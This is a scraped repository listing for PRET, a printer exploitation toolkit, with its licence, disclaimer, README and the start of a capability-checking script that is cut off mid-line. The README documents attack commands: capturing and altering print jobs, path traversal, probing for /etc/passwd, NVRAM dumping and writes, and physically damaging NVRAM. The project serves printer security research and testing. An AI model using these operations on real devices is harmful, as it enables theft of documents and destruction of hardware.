{
  "metadata": {
    "timestamp": 1736559740657,
    "page": 443,
    "hasNextPage": true,
    "endCursor": "Y3Vyc29yOjQ1MA==",
    "completionStatus": "IN_PROGRESS"
  },
  "repositories": [
    {
      "nameWithOwner": "RUB-NDS/PRET",
      "stars": 3983,
      "defaultBranch": "master",
      "files": [
        {
          "name": ".gitignore",
          "type": "blob",
          "size": 0.0185546875,
          "content": "__pycache__/\nvenv/\n"
        },
        {
          "name": "DISCLAIMER.md",
          "type": "blob",
          "size": 0.91796875,
          "content": "***********************************************************\nUSE AT YOUR OWN RISK FOR ACADEMIC & NON-MALICIOUS PURPOSES.\n***********************************************************\n\nTHIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDER AND CONTRIBUTORS\n\"AS IS\" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT\nLIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS\nFOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE\nCOPYRIGHT HOLDER OR ITS CONTRIBUTORS BE LIABLE FOR ANY DIRECT,\nINDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES\n(INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR\nSERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)\nHOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,\nSTRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)\nARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED\nOF THE POSSIBILITY OF SUCH DAMAGE.\n"
        },
        {
          "name": "LICENSE.md",
          "type": "blob",
          "size": 17.623046875,
          "content": "                    GNU GENERAL PUBLIC LICENSE\n                       Version 2, June 1991\n\n Copyright (C) 1989, 1991 Free Software Foundation, Inc., <http://fsf.org/>\n 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA\n Everyone is permitted to copy and distribute verbatim copies\n of this license document, but changing it is not allowed.\n\n                            Preamble\n\n  The licenses for most software are designed to take away your\nfreedom to share and change it.  By contrast, the GNU General Public\nLicense is intended to guarantee your freedom to share and change free\nsoftware--to make sure the software is free for all its users.  This\nGeneral Public License applies to most of the Free Software\nFoundation's software and to any other program whose authors commit to\nusing it.  (Some other Free Software Foundation software is covered by\nthe GNU Lesser General Public License instead.)  You can apply it to\nyour programs, too.\n\n  When we speak of free software, we are referring to freedom, not\nprice.  Our General Public Licenses are designed to make sure that you\nhave the freedom to distribute copies of free software (and charge for\nthis service if you wish), that you receive source code or can get it\nif you want it, that you can change the software or use pieces of it\nin new free programs; and that you know you can do these things.\n\n  To protect your rights, we need to make restrictions that forbid\nanyone to deny you these rights or to ask you to surrender the rights.\nThese restrictions translate to certain responsibilities for you if you\ndistribute copies of the software, or if you modify it.\n\n  For example, if you distribute copies of such a program, whether\ngratis or for a fee, you must give the recipients all the rights that\nyou have.  You must make sure that they, too, receive or can get the\nsource code.  And you must show them these terms so they know their\nrights.\n\n  We protect your rights with two steps: (1) copyright the software, and\n(2) offer you this license which gives you legal permission to copy,\ndistribute and/or modify the software.\n\n  Also, for each author's protection and ours, we want to make certain\nthat everyone understands that there is no warranty for this free\nsoftware.  If the software is modified by someone else and passed on, we\nwant its recipients to know that what they have is not the original, so\nthat any problems introduced by others will not reflect on the original\nauthors' reputations.\n\n  Finally, any free program is threatened constantly by software\npatents.  We wish to avoid the danger that redistributors of a free\nprogram will individually obtain patent licenses, in effect making the\nprogram proprietary.  To prevent this, we have made it clear that any\npatent must be licensed for everyone's free use or not licensed at all.\n\n  The precise terms and conditions for copying, distribution and\nmodification follow.\n\n                    GNU GENERAL PUBLIC LICENSE\n   TERMS AND CONDITIONS FOR COPYING, DISTRIBUTION AND MODIFICATION\n\n  0. This License applies to any program or other work which contains\na notice placed by the copyright holder saying it may be distributed\nunder the terms of this General Public License.  The \"Program\", below,\nrefers to any such program or work, and a \"work based on the Program\"\nmeans either the Program or any derivative work under copyright law:\nthat is to say, a work containing the Program or a portion of it,\neither verbatim or with modifications and/or translated into another\nlanguage.  (Hereinafter, translation is included without limitation in\nthe term \"modification\".)  Each licensee is addressed as \"you\".\n\nActivities other than copying, distribution and modification are not\ncovered by this License; they are outside its scope.  The act of\nrunning the Program is not restricted, and the output from the Program\nis covered only if its contents constitute a work based on the\nProgram (independent of having been made by running the Program).\nWhether that is true depends on what the Program does.\n\n  1. You may copy and distribute verbatim copies of the Program's\nsource code as you receive it, in any medium, provided that you\nconspicuously and appropriately publish on each copy an appropriate\ncopyright notice and disclaimer of warranty; keep intact all the\nnotices that refer to this License and to the absence of any warranty;\nand give any other recipients of the Program a copy of this License\nalong with the Program.\n\nYou may charge a fee for the physical act of transferring a copy, and\nyou may at your option offer warranty protection in exchange for a fee.\n\n  2. You may modify your copy or copies of the Program or any portion\nof it, thus forming a work based on the Program, and copy and\ndistribute such modifications or work under the terms of Section 1\nabove, provided that you also meet all of these conditions:\n\n    a) You must cause the modified files to carry prominent notices\n    stating that you changed the files and the date of any change.\n\n    b) You must cause any work that you distribute or publish, that in\n    whole or in part contains or is derived from the Program or any\n    part thereof, to be licensed as a whole at no charge to all third\n    parties under the terms of this License.\n\n    c) If the modified program normally reads commands interactively\n    when run, you must cause it, when started running for such\n    interactive use in the most ordinary way, to print or display an\n    announcement including an appropriate copyright notice and a\n    notice that there is no warranty (or else, saying that you provide\n    a warranty) and that users may redistribute the program under\n    these conditions, and telling the user how to view a copy of this\n    License.  (Exception: if the Program itself is interactive but\n    does not normally print such an announcement, your work based on\n    the Program is not required to print an announcement.)\n\nThese requirements apply to the modified work as a whole.  If\nidentifiable sections of that work are not derived from the Program,\nand can be reasonably considered independent and separate works in\nthemselves, then this License, and its terms, do not apply to those\nsections when you distribute them as separate works.  But when you\ndistribute the same sections as part of a whole which is a work based\non the Program, the distribution of the whole must be on the terms of\nthis License, whose permissions for other licensees extend to the\nentire whole, and thus to each and every part regardless of who wrote it.\n\nThus, it is not the intent of this section to claim rights or contest\nyour rights to work written entirely by you; rather, the intent is to\nexercise the right to control the distribution of derivative or\ncollective works based on the Program.\n\nIn addition, mere aggregation of another work not based on the Program\nwith the Program (or with a work based on the Program) on a volume of\na storage or distribution medium does not bring the other work under\nthe scope of this License.\n\n  3. You may copy and distribute the Program (or a work based on it,\nunder Section 2) in object code or executable form under the terms of\nSections 1 and 2 above provided that you also do one of the following:\n\n    a) Accompany it with the complete corresponding machine-readable\n    source code, which must be distributed under the terms of Sections\n    1 and 2 above on a medium customarily used for software interchange; or,\n\n    b) Accompany it with a written offer, valid for at least three\n    years, to give any third party, for a charge no more than your\n    cost of physically performing source distribution, a complete\n    machine-readable copy of the corresponding source code, to be\n    distributed under the terms of Sections 1 and 2 above on a medium\n    customarily used for software interchange; or,\n\n    c) Accompany it with the information you received as to the offer\n    to distribute corresponding source code.  (This alternative is\n    allowed only for noncommercial distribution and only if you\n    received the program in object code or executable form with such\n    an offer, in accord with Subsection b above.)\n\nThe source code for a work means the preferred form of the work for\nmaking modifications to it.  For an executable work, complete source\ncode means all the source code for all modules it contains, plus any\nassociated interface definition files, plus the scripts used to\ncontrol compilation and installation of the executable.  However, as a\nspecial exception, the source code distributed need not include\nanything that is normally distributed (in either source or binary\nform) with the major components (compiler, kernel, and so on) of the\noperating system on which the executable runs, unless that component\nitself accompanies the executable.\n\nIf distribution of executable or object code is made by offering\naccess to copy from a designated place, then offering equivalent\naccess to copy the source code from the same place counts as\ndistribution of the source code, even though third parties are not\ncompelled to copy the source along with the object code.\n\n  4. You may not copy, modify, sublicense, or distribute the Program\nexcept as expressly provided under this License.  Any attempt\notherwise to copy, modify, sublicense or distribute the Program is\nvoid, and will automatically terminate your rights under this License.\nHowever, parties who have received copies, or rights, from you under\nthis License will not have their licenses terminated so long as such\nparties remain in full compliance.\n\n  5. You are not required to accept this License, since you have not\nsigned it.  However, nothing else grants you permission to modify or\ndistribute the Program or its derivative works.  These actions are\nprohibited by law if you do not accept this License.  Therefore, by\nmodifying or distributing the Program (or any work based on the\nProgram), you indicate your acceptance of this License to do so, and\nall its terms and conditions for copying, distributing or modifying\nthe Program or works based on it.\n\n  6. Each time you redistribute the Program (or any work based on the\nProgram), the recipient automatically receives a license from the\noriginal licensor to copy, distribute or modify the Program subject to\nthese terms and conditions.  You may not impose any further\nrestrictions on the recipients' exercise of the rights granted herein.\nYou are not responsible for enforcing compliance by third parties to\nthis License.\n\n  7. If, as a consequence of a court judgment or allegation of patent\ninfringement or for any other reason (not limited to patent issues),\nconditions are imposed on you (whether by court order, agreement or\notherwise) that contradict the conditions of this License, they do not\nexcuse you from the conditions of this License.  If you cannot\ndistribute so as to satisfy simultaneously your obligations under this\nLicense and any other pertinent obligations, then as a consequence you\nmay not distribute the Program at all.  For example, if a patent\nlicense would not permit royalty-free redistribution of the Program by\nall those who receive copies directly or indirectly through you, then\nthe only way you could satisfy both it and this License would be to\nrefrain entirely from distribution of the Program.\n\nIf any portion of this section is held invalid or unenforceable under\nany particular circumstance, the balance of the section is intended to\napply and the section as a whole is intended to apply in other\ncircumstances.\n\nIt is not the purpose of this section to induce you to infringe any\npatents or other property right claims or to contest validity of any\nsuch claims; this section has the sole purpose of protecting the\nintegrity of the free software distribution system, which is\nimplemented by public license practices.  Many people have made\ngenerous contributions to the wide range of software distributed\nthrough that system in reliance on consistent application of that\nsystem; it is up to the author/donor to decide if he or she is willing\nto distribute software through any other system and a licensee cannot\nimpose that choice.\n\nThis section is intended to make thoroughly clear what is believed to\nbe a consequence of the rest of this License.\n\n  8. If the distribution and/or use of the Program is restricted in\ncertain countries either by patents or by copyrighted interfaces, the\noriginal copyright holder who places the Program under this License\nmay add an explicit geographical distribution limitation excluding\nthose countries, so that distribution is permitted only in or among\ncountries not thus excluded.  In such case, this License incorporates\nthe limitation as if written in the body of this License.\n\n  9. The Free Software Foundation may publish revised and/or new versions\nof the General Public License from time to time.  Such new versions will\nbe similar in spirit to the present version, but may differ in detail to\naddress new problems or concerns.\n\nEach version is given a distinguishing version number.  If the Program\nspecifies a version number of this License which applies to it and \"any\nlater version\", you have the option of following the terms and conditions\neither of that version or of any later version published by the Free\nSoftware Foundation.  If the Program does not specify a version number of\nthis License, you may choose any version ever published by the Free Software\nFoundation.\n\n  10. If you wish to incorporate parts of the Program into other free\nprograms whose distribution conditions are different, write to the author\nto ask for permission.  For software which is copyrighted by the Free\nSoftware Foundation, write to the Free Software Foundation; we sometimes\nmake exceptions for this.  Our decision will be guided by the two goals\nof preserving the free status of all derivatives of our free software and\nof promoting the sharing and reuse of software generally.\n\n                            NO WARRANTY\n\n  11. BECAUSE THE PROGRAM IS LICENSED FREE OF CHARGE, THERE IS NO WARRANTY\nFOR THE PROGRAM, TO THE EXTENT PERMITTED BY APPLICABLE LAW.  EXCEPT WHEN\nOTHERWISE STATED IN WRITING THE COPYRIGHT HOLDERS AND/OR OTHER PARTIES\nPROVIDE THE PROGRAM \"AS IS\" WITHOUT WARRANTY OF ANY KIND, EITHER EXPRESSED\nOR IMPLIED, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF\nMERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE.  THE ENTIRE RISK AS\nTO THE QUALITY AND PERFORMANCE OF THE PROGRAM IS WITH YOU.  SHOULD THE\nPROGRAM PROVE DEFECTIVE, YOU ASSUME THE COST OF ALL NECESSARY SERVICING,\nREPAIR OR CORRECTION.\n\n  12. IN NO EVENT UNLESS REQUIRED BY APPLICABLE LAW OR AGREED TO IN WRITING\nWILL ANY COPYRIGHT HOLDER, OR ANY OTHER PARTY WHO MAY MODIFY AND/OR\nREDISTRIBUTE THE PROGRAM AS PERMITTED ABOVE, BE LIABLE TO YOU FOR DAMAGES,\nINCLUDING ANY GENERAL, SPECIAL, INCIDENTAL OR CONSEQUENTIAL DAMAGES ARISING\nOUT OF THE USE OR INABILITY TO USE THE PROGRAM (INCLUDING BUT NOT LIMITED\nTO LOSS OF DATA OR DATA BEING RENDERED INACCURATE OR LOSSES SUSTAINED BY\nYOU OR THIRD PARTIES OR A FAILURE OF THE PROGRAM TO OPERATE WITH ANY OTHER\nPROGRAMS), EVEN IF SUCH HOLDER OR OTHER PARTY HAS BEEN ADVISED OF THE\nPOSSIBILITY OF SUCH DAMAGES.\n\n                     END OF TERMS AND CONDITIONS\n\n            How to Apply These Terms to Your New Programs\n\n  If you develop a new program, and you want it to be of the greatest\npossible use to the public, the best way to achieve this is to make it\nfree software which everyone can redistribute and change under these terms.\n\n  To do so, attach the following notices to the program.  It is safest\nto attach them to the start of each source file to most effectively\nconvey the exclusion of warranty; and each file should have at least\nthe \"copyright\" line and a pointer to where the full notice is found.\n\n    {description}\n    Copyright (C) {year}  {fullname}\n\n    This program is free software; you can redistribute it and/or modify\n    it under the terms of the GNU General Public License as published by\n    the Free Software Foundation; either version 2 of the License, or\n    (at your option) any later version.\n\n    This program is distributed in the hope that it will be useful,\n    but WITHOUT ANY WARRANTY; without even the implied warranty of\n    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n    GNU General Public License for more details.\n\n    You should have received a copy of the GNU General Public License along\n    with this program; if not, write to the Free Software Foundation, Inc.,\n    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.\n\nAlso add information on how to contact you by electronic and paper mail.\n\nIf the program is interactive, make it output a short notice like this\nwhen it starts in an interactive mode:\n\n    Gnomovision version 69, Copyright (C) year name of author\n    Gnomovision comes with ABSOLUTELY NO WARRANTY; for details type `show w'.\n    This is free software, and you are welcome to redistribute it\n    under certain conditions; type `show c' for details.\n\nThe hypothetical commands `show w' and `show c' should show the appropriate\nparts of the General Public License.  Of course, the commands you use may\nbe called something other than `show w' and `show c'; they could even be\nmouse-clicks or menu items--whatever suits your program.\n\nYou should also get your employer (if you work as a programmer) or your\nschool, if any, to sign a \"copyright disclaimer\" for the program, if\nnecessary.  Here is a sample; alter the names:\n\n  Yoyodyne, Inc., hereby disclaims all copyright interest in the program\n  `Gnomovision' (which makes passes at compilers) written by James Hacker.\n\n  {signature of Ty Coon}, 1 April 1989\n  Ty Coon, President of Vice\n\nThis General Public License does not permit incorporating your program into\nproprietary programs.  If your program is a subroutine library, you may\nconsider it more useful to permit linking proprietary applications with the\nlibrary.  If this is what you want to do, use the GNU Lesser General\nPublic License instead of this License.\n"
        },
        {
          "name": "README.md",
          "type": "blob",
          "size": 16.8486328125,
          "content": "## PRET - Printer Exploitation Toolkit\n\n**Is your printer secure? Check before someone else does...**\n\nPRET is a new tool for printer security testing developed in the scope of a [Master's Thesis](http://nds.rub.de/media/ei/arbeiten/2017/01/13/exploiting-printers.pdf) at Ruhr University Bochum. It connects to a device via network or USB and exploits the features of a given printer language. Currently [PostScript](https://www.adobe.com/products/postscript/pdfs/PLRM.pdf), [PJL](http://h10032.www1.hp.com/ctg/Manual/bpl13208.pdf) and [PCL](http://www.hp.com/ctg/Manual/bpl13210.pdf) are supported which are spoken by most laser printers. This allows cool stuff like capturing or manipulating print jobs, accessing the printer's file system and memory or even causing physical damage to the device. All attacks are documented in detail in the [Hacking Printers Wiki](http://hacking-printers.net/wiki/).\n\nThe main idea of PRET is to facilitate the communication between the end-user and the printer. Thus, after entering a UNIX-like command, PRET translates it to PostScript, PJL or PCL, sends it to the printer, evaluates the result and translates it back to a user-friendly format. PRET offers a whole bunch of commands useful for printer attacks and fuzzing.\n\n![PRET design](img/architecture.png)\n\n### Installation\n\nPRET only requires a Python2 interpreter. For colored output and SNMP support however, third party modules need to be installed:\n\n    # pip install colorama pysnmp\n\nIf running on a Windows console and Unicode characters are not displayed correctly, install the *win_unicode_console* module:\n\n    # pip install win_unicode_console\n\nFor experimental, ‘driverless’ printing (see print command), ImageMagick and GhostScript need to be installed:\n\n    # apt-get install imagemagick ghostscript\n\n### Usage\n\n```\nusage: pret.py [-h] [-s] [-q] [-d] [-i file] [-o file] target {ps,pjl,pcl}\n\npositional arguments:\n  target                printer device or hostname\n  {ps,pjl,pcl}          printing language to abuse\n\noptional arguments:\n  -h, --help            show this help message and exit\n  -s, --safe            verify if language is supported\n  -q, --quiet           suppress warnings and chit-chat\n  -d, --debug           enter debug mode (show traffic)\n  -i file, --load file  load and run commands from file\n  -o file, --log file   log raw data sent to the target\n```\n\n###### Example usage:\n\n    $ ./pret.py laserjet.lan ps\n    $ ./pret.py /dev/usb/lp0 pjl\n\n###### Positional Arguments:\n\nPRET requires a valid target and a printer language as arguments. The target can either be the IP address/hostname of a network printer (with port 9100/tcp open) or a device like `/dev/usb/lp0` for a local USB printer. To quickly discover all network printers in your subnet using SNMP broadcast, simply run PRET without arguments:\n\n```\n./pret.py\nNo target given, discovering local printers\n\naddress          device                       uptime    status                 \n───────────────────────────────────────────────────────────────────────────────\n192.168.1.5      hp LaserJet 4250             10:21:49   Ready                 \n192.168.1.11     HP LaserJet M3027 MFP        13 days    Paper jam             \n192.168.1.27     Lexmark X792                 153 days   Ready                 \n192.168.1.28     Brother MFC-7860DW           16:31:17   Sleep mode            \n```\n\nThe printer language to be abused must be one of `ps`, `pjl` or `pcl`. Not all languages are supported by every printer, so you may want to switch languages if you don't receive any feedback. Each printer language is mapped to a different set of PRET commands and has different capabilities to exploit.\n\n###### Optional Arguments:\n\n`--safe` tries to check via IPP, HTTP and SNMP if the selected printing language (PS/PJL/PCL) is actually supported by the device before connecting. On non-networked printers (USB, parallel cable) this test will fail.\n\n`--quit` suppresses printer model determination, intro message and some other chit-chat.\n\n`--debug` shows the datastream actually sent to the device and the feedback received. Note that header data and other overhead is filtered. The see the whole traffic, use wireshark. Debugging can also be switched on/off within a PRET session using the `debug` command \n\n`--load filename` reads and executes PRET commands from a text file. This is useful for automation. Command files can also be invoked later within a PRET session via the `load` command.\n\n`--log filename` writes a copy of the raw datastream sent to the printer into a file. This can be useful to build a malicious print job file which can be deployed on another printer not directly reachable, for example by printing it from USB drive.\n\n### Generic Commands\n\nAfter connecting to a printer device, you will see the PRET shell and can execute various commands:\n\n```\n$ ./pret.py laserjet.lan pjl\n      ________________\n    _/_______________/|\n   /___________/___//||   PRET | Printer Exploitation Toolkit v0.25\n  |===        |----| ||    by Jens Mueller <jens.a.mueller@rub.de>\n  |           |   ô| ||\n  |___________|   ô| ||\n  | ||/.´---.||    | ||        「 cause your device can be\n  |-||/_____\\||-.  | |´           more fun than paper jams 」\n  |_||=L==H==||_|__|/\n\n     (ASCII art by\n     Jan Foerster)\n\nConnection to laserjet.lan established\nDevice:   hp LaserJet 4250\n\nWelcome to the pret shell. Type help or ? to list commands.\nlaserjet.lan:/> help\n\nAvailable commands (type help <topic>):\n=======================================\nappend  debug    edit    free  id    ls       open      restart   timeout  \ncat     delete   env     fuzz  info  mirror   printenv  selftest  touch    \ncd      df       exit    get   load  mkdir    put       set       traversal\nchvol   disable  find    help  lock  nvram    pwd       site      unlock   \nclose   display  format  hold  loop  offline  reset     status    version  \n\nlaserjet.lan:/> ls ../../\n-      834   .profile\nd        -   bin\nd        -   dev\nd        -   etc\nd        -   hp\nd        -   hpmnt\n-     1276   init\nd        -   lib\nd        -   pipe\nd        -   tmp\nlaserjet.lan:/> exit\n```\n\nA list of generic PRET commands is given below:\n\n```\nhelp      List available commands or get detailed help with 'help cmd'.\ndebug     Enter debug mode. Use 'hex' for hexdump:  debug [hex]\nload      Run commands from file:  load cmd.txt\nloop      Run command for multiple arguments:  loop <cmd> <arg1> <arg2> …\nopen      Connect to remote device:  open <target>\nclose     Disconnect from device.\ntimeout   Set connection timeout:  timeout <seconds>\ndiscover  Discover local printer devices via SNMP.\nprint     Print image file or raw text:  print <file>|\"text\"\nsite      Execute custom command on printer:  site <command>\nexit      Exit the interpreter.\n```\n\nGeneric file system operations with a PS/PJL/PCL specific implementation are:\n\n```\n┌───────────┬─────┬─────┬─────┬────────────────────────────────────────┐\n│ Command   │ PS  │ PJL │ PCL │ Description                            │\n├───────────┼─────┼─────┼─────┼────────────────────────────────────────┤\n│ ls        │  ✓  │  ✓  │  ✓  │ List contents of remote directory.     │\n│ get       │  ✓  │  ✓  │  ✓  │ Receive file: get <file>               │\n│ put       │  ✓  │  ✓  │  ✓  │ Send file: put <local file>            │\n│ append    │  ✓  │  ✓  │     │ Append to file: append <file> <str>    │\n│ delete    │  ✓  │  ✓  │  ✓  │ Delete remote file: delete <file>      │\n│ rename    │  ✓  │     │     │ Rename remote file: rename <old> <new> │\n│ find      │  ✓  │  ✓  │     │ Recursively list directory contents.   │\n│ mirror    │  ✓  │  ✓  │     │ Mirror remote filesystem to local dir. │\n│ cat       │  ✓  │  ✓  │  ✓  │ Output remote file to stdout.          │\n│ edit      │  ✓  │  ✓  │  ✓  │ Edit remote files with vim.            │\n│ touch     │  ✓  │  ✓  │     │ Update file timestamps: touch <file>   │\n│ mkdir     │  ✓  │  ✓  │     │ Create remote directory: mkdir <path>  │\n├───────────┼─────┼─────┼─────┼────────────────────────────────────────┤\n│ cd        │  ✓  │  ✓  │     │ Change remote working directory.       │\n│ pwd       │  ✓  │  ✓  │     │ Show working directory on device.      │\n│ chvol     │  ✓  │  ✓  │     │ Change remote volume: chvol <volume>   │\n│ traversal │  ✓  │  ✓  │     │ Set path traversal: traversal <path>   │\n├───────────┼─────┼─────┼─────┼────────────────────────────────────────┤\n│ format    │  ✓  │  ✓  │     │ Initialize printer's file system.      │\n│ fuzz      │  ✓  │  ✓  │     │ File system fuzzing: fuzz <category>   │\n├─ ─ ─ ─ ─ ─┴─ ─ ─┴─ ─ ─┴─ ─ ─┴─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ┤\n│   path   - Explore fs structure with path traversal strategies.      │\n│   write  - First put/append file, then check for its existence.      │\n│   blind  - Read-only tests for existing files like /etc/passwd.      │\n├───────────┬─────┬─────┬─────┬────────────────────────────────────────┤\n│ df        │  ✓  │  ✓  │     │ Show volume information.               │\n│ free      │  ✓  │  ✓  │  ✓  │ Show available memory.                 │\n└───────────┴─────┴─────┴─────┴────────────────────────────────────────┘\n```\n\n### Commands in PS mode\n\n```\nid         Show device information.\nversion    Show PostScript interpreter version.\ndevices    Show available I/O devices.\nuptime     Show system uptime (might be random).\ndate       Show printer's system date and time.\npagecount  Show printer's page counter.\n\nlock       Set startjob and system parameters password.\nunlock     Unset startjob and system parameters password.\nrestart    Restart PostScript interpreter.\nreset      Reset PostScript settings to factory defaults.\ndisable    Disable printing functionality.\ndestroy    Cause physical damage to printer's NVRAM.\nhang       Execute PostScript infinite loop.\n\noverlay    Put overlay eps file on all hardcopies:  overlay <file.eps>\ncross      Put printer graffiti on all hardcopies:  cross <font> <text>\nreplace    Replace string in documents to be printed:  replace <old> <new>\ncapture    Capture further jobs to be printed on this device.\nhold       Enable job retention.\n\nset        Set key to value in topmost dictionary:  set <key=value>\nknown      List supported PostScript operators:  known <operator>\nsearch     Search all dictionaries by key:  search <key>\ndicts      Return a list of dictionaries and their permissions.\nresource   List or dump PostScript resource:  resource <category> [dump]\n\ndump       Dump dictionary:  dump <dict>\n  Dictionaries: - systemdict - statusdict - userdict \n                - globaldict - serverdict - errordict\n                - internaldict - currentsystemparams\n                - currentuserparams - currentpagedevice\n\nconfig     Change printer settings:  config <setting>\n  duplex        - Set duplex printing.\n  copies #      - Set number of copies.\n  economode     - Set economic mode.\n  negative      - Set negative print.\n  mirror        - Set mirror inversion.\n```\n\nNot all commands are supported by every printer. Especially Brother and Kyocera devices use their own PostScript clones – Br-Script and KPDL – instead of licensing original ‘Adobe PostScript’. Such flavours of the PostScript language may not be 100% compatible, especially concerning security sensitive features like capturing print jobs. Access to the file system is supported by most printers, however usually limited to a certain, sandboxed directory.\n\n### Commands in PJL mode\n\n```\nid         Show device information.\nstatus     Enable status messages.\nversion    Show firmware version or serial number (from 'info config').\npagecount  Manipulate printer's page counter:  pagecount <number>\nprintenv   Show printer environment variable:  printenv <VAR>\nenv        Show environment variables (alias for 'info variables').\nset        Set printer environment variable:  set <VAR=VALUE>\n\ndisplay    Set printer's display message:  display <message>\noffline    Take printer offline and display message:  offline <message>\nrestart    Restart printer.\nreset      Reset to factory defaults.\nselftest   Perform various printer self-tests.\ndisable    Disable printing functionality.\ndestroy    Cause physical damage to printer's NVRAM.\nflood      Flood user input, may reveal buffer overflows.\n\nlock       Lock control panel settings and disk write access.\nunlock     Unlock control panel settings and disk write access.\nhold       Enable job retention.\n\nnvram      NVRAM operations:  nvram <operation>\n  nvram dump [all]           - Dump (all) NVRAM to local file.\n  nvram read addr            - Read single byte from address.\n  nvram write addr value     - Write single byte to address.\n\ninfo       Show information:  info <category>\n  info config      - Provides configuration information.\n  info filesys     - Returns PJL file system information.\n  info id          - Provides the printer model number.\n  info memory      - Identifies amount of memory available.\n  info pagecount   - Returns the number of pages printed.\n  info status      - Provides the current printer status.\n  info ustatus     - Lists the unsolicited status variables.\n  info variables   - Lists printer's environment variables.\n```\n\nSome commands are supported exclusively by HP printers, because other vendors have only implemented a subset of the PJL standard. This is especially true for PML based commands like `restart`or `reset`. Enabling long-term job retention via the `hold` command seems to be possible for some Epson devices only. NVRAM access via the `nvram` command is a proprietary feature of Brother printers. Limited access to the file system is supported by various HP, OKI, Konica, Xerox, Epson and Ricoh devices.\n\n### Commands in PCL mode\n\n```\nselftest   Perform printer self-test.\ninfo       Show information:  info <category>\n  info fonts      - Show installed fonts.\n  info macros     - Show installed macros.\n  info patterns   - Show user-defined patterns.\n  info symbols    - Show symbol sets.\n  info extended   - Show extended fonts.\n```\n\nPCL is a very limited page description language without access to the file system. The `get`/`put`/`ls` commands therefore use a virtual file system based on PCL macros, implemented mostly for the hack value. This proof-of-concept shows that even a device which supports only minimalist languages like PCL can be used to store arbitrary files like copyright infringing material. Although such a file sharing service is not a security vulnerability per se, it might apply as ‘misuse of service’ depending on the corporate policy\n\n### File Listing\n\n- `pret.py` - Executable main program\n- `capabilities.py` - Routines to check for printer language support\n- `discovery.py` - Routines to list printers using SNMP broadcast\n- `printer.py` - Generic code to describe a printing device\n- `postscript.py` - PS specific code (inherits from class printer)\n- `pjl.py` - PJL specific code (inherits from class printer)\n- `pcl.py` - PCL specific code (inherits from class printer)\n- `helper.py` - Help functions for output, logging, sockets, etc.\n- `codebook.py` - Static table of PJL status/error codes\n- `fuzzer.py` - Constants for file system fuzzing\n- `mibs/*` - Printer specific SNMP MIBs\n- `db/*` - database of supported models\n- `lpd/*` - Scripts for LPD fuzzing\n\n### Getting Started\n\nGiven the features and various proprietary extensions in printing languages like PostScript and PJL, conducting a pentest on printers is not a trivial job. PRET can help to assist and verify known issues in the language. Once you have played around with the tool, you may want to perform a systematic printer security analysis. A good starting point is the [Printer Security Testing Cheat Sheet](http://hacking-printers.net/wiki/index.php?title=Printer_Security_Testing_Cheat_Sheet).\n\n**Happy Hacking!**\n"
        },
        {
          "name": "capabilities.py",
          "type": "blob",
          "size": 9.1796875,
          "content": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\n# python standard library\nimport re\nimport os\nimport sys  # , urllib.error, urllib.parse\n\nimport requests\n\nimport urllib3\n\n# local pret classes\nfrom helper import output, item\n\n# third party modules\ntry:\n    from pysnmp.entity.rfc3413.oneliner import cmdgen\nexcept ImportError:\n    pass\n\n\nclass capabilities():\n    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\n    # set defaults\n    support = False\n    # be quick and dirty\n    timeout = 1.5\n    # set pret.py directory\n    rundir = os.path.dirname(os.path.realpath(__file__)) + os.path.sep\n    '''\n  ┌──────────────────────────────────────────────────────────┐\n  │            how to get printer's capabilities?            │\n  ├──────┬───────────────────────┬───────────────────────────┤\n  │      │ model (for db lookup) │ lang (ps/pjl/pcl support) │\n  ├──────┼───────────────────────┼───────────────────────────┤\n  │ IPP  │ printer-description   │ printer-description       │\n  │ SNMP │ hrDeviceDescr         │ prtInterpreterDescription │\n  │ HTTP │ html-title            │ -                         │\n  | HTTPS| html-title            | -                         |\n  └──────┴───────────────────────┴───────────────────────────┘\n  '''\n\n    def __init__(self, args):\n        # skip this in unsafe mode\n        if not args.safe:\n            return\n        # set printer language\n        if args.mode == 'ps':\n            lang = [\"PS\", \"PostScript\", \"BR-Script\", \"KPDL\"]\n        if args.mode == 'pjl':\n            lang = [\"PJL\"]\n        if args.mode == 'pcl':\n            lang = [\"PCL\"]\n        # get list of PostScript/PJL/PCL capable printers\n        self.models = self.get_models(args.mode + \".dat\")\n        # try to get printer capabilities via IPP/SNMP/HTTP\n        if not self.support:\n            self.ipp(args.target, lang)\n        if not self.support:\n            self.http(args.target)\n        if not self.support:\n            self.https(args.target)\n        if not self.support:\n            self.snmp(args.target, lang)\n        # feedback on PostScript/PJL/PCL support\n        self.feedback(self.support, lang[0])\n        # in safe mode, exit if unsupported\n        if args.safe and not self.support:\n            print((os.linesep + \"Quitting as we are in safe mode.\"))\n            sys.exit()\n        print(\"\")\n\n    # - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\n    # get capabilities via IPP\n    def ipp(self, host, lang):\n        try:\n            # poor man's way to get printer info via IPP\n            sys.stdout.write(\"Checking for IPP support:         \")\n            body = (\"\\x01\\x01\\x00\\x0b\\x00\\x01\\xab\\x10\\x01G\\x00\\x12attributes-charset\\x00\\x05utf-8H\"\n                    + \"\\x00\\x1battributes-natural-language\\x00\\x02enE\\x00\\x0bprinter-uri\\x00\\x14ipp:\"\n                    + \"//localhost/ipp/D\\x00\\x14requested-attributes\\x00\\x13printer-description\\x03\").encode()\n            request = requests.get(\"http://\" + host + 